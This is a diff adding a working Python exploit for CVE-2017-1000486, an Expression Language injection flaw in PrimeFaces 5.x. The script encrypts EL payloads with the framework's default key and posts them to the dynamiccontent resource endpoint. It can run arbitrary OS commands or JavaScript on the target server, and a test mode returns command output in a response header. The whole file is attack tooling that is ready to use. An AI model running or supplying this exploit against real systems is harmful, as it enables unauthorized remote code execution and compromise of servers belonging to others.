@@ -1,0 +1,132 @@
+
+#!/usr/bin/env python3
+
+import requests
+import argparse
+import os.path
+import base64
+from Crypto.Hash import MD5
+from Crypto.Cipher import DES
+import urllib
+from urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+def send_request(url, payload, extension):
+    post_params = {
+        'pfdrt': 'sc',
+        'ln': 'primefaces',
+        'pfdrid' : payload,
+    }
+
+    target_url = url + "/javax.faces.resource/dynamiccontent.properties." + extension 
+
+    print("[+] Sending payload")
+    try:
+        print("[*] Payload: ", urllib.parse.quote_plus(payload))
+        response = requests.post(target_url, data = post_params, verify=False, allow_redirects=False)
+        return response
+    except:
+        print("[-] Error: Unable to connect to target {}".format(url))
+        exit(1)
+
+
+def encrypt_js_code(filename):
+    try: 
+        js_file = open(filename, 'r')
+        payload = js_file.read() 
+        payload = payload.replace('"','M0gWaI').strip()
+        full_payload = "${facesContext.getExternalContext().getClass().getClassLoader().loadClass(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + payload + "\".replace('M0gWaI','\"'))}"
+        js_file.close()
+        return encrypt(full_payload)
+    except:
+        print("[-] Error: Unable to read JavaScript payload from file {0}".format(filename))
+        exit(1)
+
+
+def encrypt_os_command(command):
+
+    # I'm lazy 
+    if command.find("\"") != -1:
+        print("[-] Error, your command contains a double quote, please use a JavaScript file instead")
+        exit(1)
+
+    full_payload = "${facesContext.getExternalContext().getClass().getClassLoader().loadClass(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('" + command + "')\")}"
+    return encrypt(full_payload)
+
+
+
+def encrypt(plaintext, password = b"primefaces", salt = b"\xA9\x9B\xC8\x32\x56\x34\xE3\x03", iterations=19):
+    # based on https://stackoverflow.com/questions/24168246/replicate-javas-pbewithmd5anddes-in-python-2-7
+    # Pad plaintext per RFC 2898 Section 6.1
+    padding = 8 - len(plaintext) % 8
+    plaintext += chr(padding) * padding
+    
+    hasher = MD5.new()
+    hasher.update(password)
+    hasher.update(salt)
+    result = hasher.digest()
+
+    for i in range(1, iterations):
+        hasher = MD5.new()
+        hasher.update(result)
+        result = hasher.digest()
+
+    encoder = DES.new(result[:8], DES.MODE_CBC, result[8:16])
+    encrypted = encoder.encrypt(plaintext.encode("utf8"))
+    return base64.b64encode(encrypted)
+
+
+
+if __name__== "__main__":
+    print("")    
+    print("PrimeFaces 5.x EL injection exploit (CVE-2017-1000486) by MOGWAI LABS")
+    print("Modded by Jeremiasz Pluta")
+    print("Example: python3 primefaces.py -t vulnapp.com id")
+    print("=====================================================================")
+    print("")
+    argparser = argparse.ArgumentParser(description="PrimeFaces 5.x EL injection exploit")
+    argparser.add_argument("url", help="The target URL (http/https)")
+    argparser.add_argument("payload", help="Command to run", nargs='?')
+    argparser.add_argument("-t", "--test", help="Generate payload to run with HTTP response", action='store_true')
+    argparser.add_argument("-e", "--extension", help="Extension of the target (xhtml, jsf)", default="xhtml")
+
+    arguments = argparser.parse_args()
+    target_url = arguments.url 
+    target_extension = arguments.extension
+
+    if arguments.test: #
+        proxy = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'} #proxy settings
+        command = arguments.payload
+        print("[*] Command to execute: ", command)
+        payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"RCE\",facesContext.getExternalContext().getClass().getClassLoader().loadClass(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"function x (){const a = java.lang.Runtime.getRuntime().exec('" + command + "').getInputStream(); var s = ''; for (var i = 0; i < 1000; i++) {var y = a.read(); if (y < 0) {break;}; s+=String.fromCharCode(y);} return s;};x()\"))}") #run the java code to add RCE header to response with command exec result
+        print("[*] Generated payload: ", payload)
+        print("[*] Sending requests...")
+        vuln_point = "/javax.faces.resource/j2eescan.jsf" #universal endpoint, change it if it gives 404
+        print("[*] Using vulnerable endpoint: ", vuln_point)
+        url = target_url + vuln_point
+        data = "pfdrt=sc&ln=primefaces&pfdrid=" + urllib.parse.quote_plus(payload.decode("utf-8")) #url + payload
+        response = requests.get(url=url+"?"+data, proxies=proxy, verify=False, allow_redirects=False)
+
+        if "RCE" in response.headers:
+            print("[+] Target is vulnerable")
+            print("[#] Result of command:")
+            result = response.headers.get("RCE")
+            print(result)
+        else:
+            print("[-] Target is not vulnerable")
+
+        exit(0)
+
+    # Execute the actual payload
+    # Are we dealing with a file or a OS command
+    if os.path.isfile(arguments.payload):
+        payload = encrypt_js_code(arguments.payload)
+        print("[+] Running JS file: {}".format(arguments.payload))
+        send_request(target_url, payload, target_extension)
+    else:
+        payload = encrypt_os_command(arguments.payload)
+        print("[+] Running OS command: {}".format(arguments.payload))
+        send_request(target_url, payload, target_extension)
+
+    print("[+] Done")
